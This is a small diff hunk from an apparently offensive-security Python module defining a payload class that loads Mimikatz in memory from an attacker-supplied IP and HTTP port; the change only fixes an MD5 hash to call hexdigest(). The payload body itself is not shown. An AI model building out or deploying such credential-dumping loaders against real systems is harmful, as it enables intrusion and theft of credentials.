@@ -12,7 +12,7 @@ class Payload:
     type = 'cmd'
     args = ['ip:http_port']
     filename = 'loader_x64.exe'
-    md5 = hashlib.md5(b'loader_mimikatz_payload_x64')
+    md5 = hashlib.md5(b'loader_mimikatz_payload_x64').hexdigest()
 
     def generate_payload(self, ip_port):
         # Mimikatz in memory
